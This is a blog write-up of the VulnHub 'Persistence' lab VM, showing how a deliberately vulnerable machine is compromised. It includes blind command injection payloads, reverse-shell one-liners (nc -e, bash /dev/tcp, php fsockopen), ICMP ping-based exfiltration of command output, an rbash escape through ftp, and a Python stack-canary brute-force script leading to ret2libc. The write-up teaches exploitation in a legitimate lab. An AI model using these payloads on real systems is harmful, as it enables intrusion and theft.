---
categories:
- CTF
- Vulnerable VM
- Solution
- Challenge
- VulnHub
comments: true
date: 2014-09-18T06:58:53Z
title: From Persistence, to pain, to PWN
---

## persist we must!
Persistence! A new boot2root hosted [@VulnHub](https://twitter.com/vulnhub), authored by [@superkojiman](https://twitter.com/superkojiman) and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a [writeup competition](http://blog.vulnhub.com/2014/09/competition-persistence.html) launched on September the 7th, and ran up until October th 5th.

This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go "meh, next". As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!

<!--more-->

## lets get our hands dirty
As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.

My VM got the IP 192.168.56.104, and the first Nmap result was:

```bash
root@kali:~# nmap 192.168.56.104 --reason -sV -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 07:01 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0037s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.4.7

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4131.90 seconds
```

Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.

Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what...) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.

By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried `index.html`, and got the normal landing. When I requested `index.php` though, things changed drastically:

```bash
root@kali:~# curl -v 192.168.56.104/index.php
* About to connect() to 192.168.56.104 port 80 (#0)
*   Trying 192.168.56.104...
* connected
* Connected to 192.168.56.104 (192.168.56.104) port 80 (#0)
> GET /index.php HTTP/1.1
> User-Agent: curl/7.26.0
> Host: 192.168.56.104
> Accept: */*

* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 404 Not Found
< Server: nginx/1.4.7
< Date: Thu, 18 Sep 2014 07:28:18 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/5.3.3

No input file specified.

* Connection #0 to host 192.168.56.104 left intact
* Closing connection #0
```

As can be seen in the output above, the header `X-Powered-By: PHP/5.3.3` is now present, and the output `No input file specified.`. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.

## finding that (de)bugger
With this information now gathered, it was time to pull out one of my favorite tools, `wfuzz`! With `wfuzz`, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.

My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending _.php_ to my `FUZZ` keyword:

```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.104/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
==================================================================
ID  Response   Lines      Word         Chars          Request
==================================================================

00434:  C=200     12 L        28 W      357 Ch    " - debug"
```

Yay. `wfuzz` is stupidly fast and finished the above in like 4 seconds. Browsing to http://192.168.56.101/debug.php showed us a input field labeled "Ping address:" and a submit button

{{< figure src="/images/persistence_debug_php.png" >}}

"Command injection?", was the first thought here.

## blind command injection
I started by entering a valid IP address that had `tcpdump` listening to test if the script is actually running a ping like it says ...

```bash
root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
07:46:15.503023 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 64004, seq 1, length 64
07:46:15.503040 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 64004, seq 1, length 64
07:46:16.503729 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 64004, seq 2, length 64
07:46:16.503768 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 64004, seq 2, length 64
07:46:17.503180 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 64004, seq 3, length 64
07:46:17.503260 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 64004, seq 3, length 64
07:46:18.502811 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 64004, seq 4, length 64
07:46:18.502842 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 64004, seq 4, length 64
```

... which it was. What is important to note here is that we have 4 echo requests.

I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field `;exit 0;` caused the HTTP request to complete almost instantly while no ping requests were observed on the `tcpdump`. This had me certain that this field was vulnerable to a command injection vulnerability.

This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.

I tried the usual culprits: `nc <ip>  <port> -e /bin/bash`; `bash -i >& /dev/tcp/<ip>/<port> 0>&1`; `php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'`. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?

## blind command injection - file enumeration
Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.

I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash `if [ -f /file ]` statement, with a single ping for success, and 2 pings for a failure. The string for the `debug.php` input field looked something like this:

```bash
;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi
```

Submitting the above input presented me with a single ping, confirming that `/bin/sh` exists.

```bash
root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
08:15:53.557994 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 63493, seq 1, length 64
08:15:53.558011 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 63493, seq 1, length 64

```

Checking for something like `/bin/sh2` responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as `/bin/nc`, I may end up with greater success of a shell!

I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  `/usr/bin/python` appeared to be available! I really like python so this had me really happy.

## blind command injection - port scanner
I tested a few commands with `python -c`, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.

No. Luck.

I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port 'prober' so that I can try and determine which port is open outgoing. The idea was to watch my `tcpdump` for any tcp traffic comming from this host:

```python
import socket
for port in xrange(1, 65535):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)
    sock.connect_ex(("192.168.56.102", port))
    sock.close()
```

Using my blind command injection, I echoed this content to `/tmp/probe.py` via the input field, and then in a subsequent request, ran it using `python /tmp/probe.py`. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open...

## data exfiltration
With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the `debug.php` file on disk and tried to echo a PHP web shell to the same directory. This also failed.

So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.

Eventually, I came across the `-p` argument for ping after reading [this](http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html) blogpost. From `man 8 ping` we read:

```bash
-p pattern
   You may specify up to 16 ``pad'' bytes to fill out the packet you send.
   This is useful for diagnosing data-dependent problems in a network.
   For example, ``-p ff'' will cause the sent packet to be filled with all ones.
```

So that changes things. I quickly confirmed that we have `xxd` available using my previous enumeration method and we did. Great.

I fired up tcpdump with the `-X` flag to show me the packet contents, and tested it out with the following payload for the `id` command:


```bash
;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
```

On the `tcpdump` side of things...

```bash
root@kali:~/Desktop# tcpdump icmp -X
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
09:18:14.439222 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 6920, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K[....V..T
    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0050:  3439 3828                                498(
09:18:14.439248 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 6920, seq 1, length 64
    0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
    0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S[....V..T
    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0050:  3439 3828                                498(
09:18:14.440365 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 7176, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0050:  3938 286e                                98(n
09:18:14.440382 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 7176, seq 1, length 64
    0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
    0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0050:  3938 286e                                98(n
09:18:14.441191 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 7432, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0050:  3d34 3938                                =498
09:18:14.441198 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 7432, seq 1, length 64
    0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..>..8f
    0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0050:  3d34 3938                                =498
```

Mind. Blown.

In case you don't see it, we have extracts of the `id` command in the request/response packets like _98(nginx).grid=4_. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact **something** to work with!

I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.

```python
>>> sniff(filter="icmp[icmptype] == 8 and host 192.168.56.104", prn=lambda x: x.load)
ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
ؤT
   ginx) grid=498(nginx) grid=498(nginx) grid=498(n
ؤT�(nginx)
oups=498(nginx)
oups=498(nginx)
oups=498
```

## sysadmin-tool
So with actual output to work with, I can almost say I have shell, however, it's crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.

At one stage I ran `ls` as the command trying to see if there was anything in the web path that I may not have found yet. A file called _sysadmin-tool_ was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through `strings`:

```bash
root@kali:~# strings sysadmin-tool
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
chroot
strncmp
puts
setreuid
mkdir
rmdir
chdir
system
__libc_start_main
GLIBC_2.0
PTRh
[^_]
Usage: sysadmin-tool --activate-service
--activate-service
breakout
/bin/sed -i 's/^#//' /etc/sysconfig/iptables
/sbin/iptables-restore < /etc/sysconfig/iptables
Service started...
Use avida:dollars to access.
/nginx/usr/share/nginx/html/breakout
```

From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:

```bash
;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
```

```bash
root@kali:~# nmap 192.168.56.104 --reason -sV -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 09:46 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0017s latency).
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.3 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.4.7

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
```

Yay! SSH.

## shell and breakout as avida
Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:

```bash
root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.104' (RSA) to the list of known hosts.
avida@192.168.56.104's password:    # dollars
Last login: Thu Sep 18 05:57:30 2014
-rbash-4.1$
```

Op success. Or is it? I immediately noticed the prompt as `rbash`, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a `/` in them.

```bash
-rbash-4.1$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
```

So the next logical step was to attempt 'breaking out' of this shell so that I can have a better look around. I was able to cat say `/etc/passwd`, but that only gets you _that_ far :P

After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic `vi` `:shell` breakout. Eventually (and out of desperation), I focussed my attention to `ftp`. Opening `ftp`, and typing `help` at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:

```bash
-rbash-4.1$ ftp
ftp> !
+rbash-4.1$ /bin/bash
bash-4.1$
```

I got dropped into another `rbash` shell, however this time with a +. So, I went for `/bin/bash` and... w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!

## the wopr game
During the enumeration done while still stuck with `rbash`, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of `netstat`. Opening a telnet session to this port presented you with a 'game':

```bash
bash-4.1$ telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
[+] hello, my name is sploitable
[+] would you like to play a game?
> yes!
[+] yeah, I don't think so
[+] bye!
Connection closed by foreign host.
bash-4.1$
```

I asked really, really nicely, but no matter how polite I was, it would just not let me play!

Further inspection showed that the game was possibly run as root from `/usr/local/bin/wopr`

```bash
bash-4.1$ ps -ef | grep wopr
root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
root      1577  1005  0 06:43 ?        00:00:00 [wopr] <defunct>
avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr

bash-4.1$ ls -lah /usr/local/bin/wopr
-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
```

`wopr` was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:

```bash
# first, hex encode the file
bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
7f454c460101010000000000000000000200030001000000c08604083400000080110000
0000000034002000090028001e001b000600000034000000348004083480040820010000
[... snip ...]
38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
bash-4.1$

# next, I copied the xxd output from the persistence terminal
# and pasted it into a file called wopr.xxd. Then reverted it
# and redirected the output to `wopr`
root@kali:~# cat wopr.xxd | xxd -r -p > wopr
```

The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all...

## wopr, stack smashing
Poking around the binary, I mostly used `gdb` along with [peda](https://github.com/longld/peda).
Checksec revealed that this binary was compiled with quite a few security features built in.

```bash
root@kali:~# gdb -q ./wopr
Reading symbols from persistence/wopr...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.

With all of that in mind, I ran the binary with the `r` command, and made a new telnet session to it.

```bash
gdb-peda$ r
[+] bind complete
[+] waiting for connections
[+] logging queries to $TMPLOG
[+] got a connection
[New process 26936]
[Inferior 2 (process 26936) exited normally]
Warning: not running or target is remote
gdb-peda$
```

When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a `fork()`

```bash
gdb-peda$ disass main
Dump of assembler code for function main:
    [.. snip ..]
   0x080489fd <+543>:   mov    DWORD PTR [esp],0x8048cb2
   0x08048a04 <+550>:   call   0x804866c <puts@plt>
   0x08048a09 <+555>:   call   0x804867c <fork@plt> # <--
   0x08048a0e <+560>:   test   eax,eax
   0x08048a10 <+562>:   jne    0x8048b0e <main+816>
   0x08048a16 <+568>:   mov    DWORD PTR [esp+0x8],0x21
   0x08048a1e <+576>:   mov    DWORD PTR [esp+0x4],0x8048cc8
   0x08048a26 <+584>:   mov    eax,DWORD PTR [ebp-0x22c]
   0x08048a2c <+590>:   mov    DWORD PTR [esp],eax
   0x08048a2f <+593>:   call   0x804858c <write@plt>
    [.. snip ..]
End of assembler dump.
gdb-peda$
```

Why is the `fork()` so important!? We will see in a bit just hang on. :)

So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D

Sending 30 x A's results in:
```bash
gdb-peda$ [+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
wopr[0x8048ad6]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xe6)[0xb7e8ae36]
wopr[0x80486e1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 1184792    wopr
08049000-0804a000 r--p 00000000 08:01 1184792    wopr
0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e73000-b7e74000 rw-p 00000000 00:00 0
b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc1000-b7fc4000 rw-p 00000000 00:00 0
b7fde000-b7fe1000 rw-p 00000000 00:00 0
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
```

So it looks like we may have a [buffer overflow](http://en.wikipedia.org/wiki/Stack_buffer_overflow) here. What is important though is the backtrace shows that the last fail was in `__fortify_fail`. `__fortify_fail` is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the `checksec` output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.

But lets not stop there. I continued to place more A's into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A's, the backtrace had a full 4 bytes of 41.

```bash
[+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
[0x41414141]        #<-- EIP?
```

Was this where EIP was?
With the debugging we have done thus far, lets assume that the stack layout looks something like this:

```text
- ->         - ->        [42 Bytes  in Total]        - ->         - >

[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]

- ->         - ->        [42 Bytes  in Total]        - ->         - >
```

## wopr - stack canary bruteforce
This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.

A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was

- [Phrack Issue 67](http://phrack.org/issues/67/13.html)
- [The Art Of ELF: Analysis and Exploitations](http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/)
- [Fusion level04 write-up](http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/) (SPOILER ALERTS for another CTF)

Now, remember I mentioned `fork()` earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of `fork()` and how this affects stack cookies.

From `man 2 fork`'s description:

```bash
DESCRIPTION
     Fork() causes creation of a new process.  The new process (child process)
     is an exact copy of the calling process (parent process) except for the
     following:

 [.. snip ..]
```

What this means for us then is that every time we have a new `fork()` happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. _”Soooooooo what?”_ I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!

The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of `wopr`, I can just watch the console output, however, I don't have that luxury on the Persistence VM!

While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) -> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!

When a string of less than 30 A's is sent, the server will send a "[+] bye!" message before closing the socket. More than 30 A's, and the socket is killed before the bye

```bash
root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
[+] hello, my name is sploitable
[+] would you like to play a game?
> A
[+] yeah, I don't think so
[+] bye!                           # <-- We have a bye!
Connection closed by foreign host.

root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
[+] hello, my name is sploitable
[+] would you like to play a game?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] yeah, I don't think so
Connection closed by foreign host. # <-- No bye!
```

This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word _bye_ in the last socket receive to know if we have succeeded or not. The resultant script was therefore:

```python
import socket
import sys

payload = "A" * 30  # amount of bytes before the first canary bit is hit
canary = ""         # the canary

# start the canary brute loop. We want to brute 4 bytes ...
for x in xrange(1,5):

    # ... and try all possibilities
    for canary_byte in xrange(0, 256):

        # prepare the byte
        hex_byte = chr(canary_byte)

        # prepare the payload
        send = payload + canary + hex_byte

        print "[+] Trying: '\\x{0}' in payload '%s' (%d:%d/255)".format(hex_byte.encode("hex")) % (send, x, canary_byte)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 3333))

        # get the inital banners
        sock.recv(35)   # [+] hello, my name is sploitable\n
        sock.recv(40)   # [+] would you like to play a game?\n
        sock.recv(5)    # >

        # send the payload
        sock.send(send)
        sock.recv(27)   # [+] yeah, I don't think so\n

        # if we have a OK response, then we will have this last part
        # as '[+] bye!\n' populated, if its wrong, not
        data =  sock.recv(64)   # [+] bye!\n
        if "bye" in data:
            print "[!!] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
            canary += hex_byte
            sock.close()
            break

        sock.close()

    # if we cant even find the first byte, we failed already
    if len(canary) <= 0:
        print "[-] Unable to even find the first bit. No luck"
        sys.exit(0)

if len(canary) > 0:
    print "[+] Canary seems to be {0}".format(canary.encode("hex"))
else:
    print "[-] Unable to brute canary"
```

An example run of this would end as follows:

```bash
[+] Trying: '\x8d' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:141/255)
[+] Trying: '\x8e' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:142/255)
[+] Trying: '\x8f' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:143/255)
[+] Trying: '\x90' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:144/255)
[!!] Found a possible canary value of '90'!
[+] Canary seems to be 00ef8d90
```

Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A's and send it. No stack smashing message appeared and we got the _bye_ message :)

## wopr - NX and EIP
If you can recall from earlier, `wopr` was compiled with the NX bit set. Effectively that means we can't simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.

The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the `system()` command, for almost obvious reasons.

I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:

```bash
bash-4.1$ ldd /usr/local/bin/wopr
    linux-gate.so.1 =>  (0xb7fff000)
    libc.so.6 => /lib/libc.so.6 (0xb7e62000)
    /lib/ld-linux.so.2 (0x00110000)

bash-4.1$ ldd /usr/local/bin/wopr
    linux-gate.so.1 =>  (0xb7fff000)
    libc.so.6 => /lib/libc.so.6 (0xb7e62000)
    /lib/ld-linux.so.2 (0x00110000)
```

The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)

The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple `export SHELL=/bin/bash` fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.

```bash
bash-4.1$ export SHELL=/bin/bash

bash-4.1$ gdb -q /usr/bin/telnet
Reading symbols from /usr/bin/telnet...(no debugging symbols found)...done.
Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
(gdb) b *main   # set a breakpoint to stop the flow once we hit the main() func
Breakpoint 1 at 0x7b90

(gdb) r         # run the program
Starting program: /usr/bin/telnet
Breakpoint 1, 0x00117b90 in main ()

(gdb) p system  # We hit our breakpoint, lets leak the address for system()
$1 = {<text variable, no debug info>} 0xb7e56210 <system>
(gdb)
```

We find `system()` at `0xb7e56210`. I used the telnet binary simply because it is also linked to libc.

So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:

```text
- ->         - ->        [42 Bytes  in Total]        - ->           - >

[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
 ^~ Initial BF    ^~ Bruted cookie                    ^~ system()

- ->         - ->        [42 Bytes  in Total]        - ->           - >
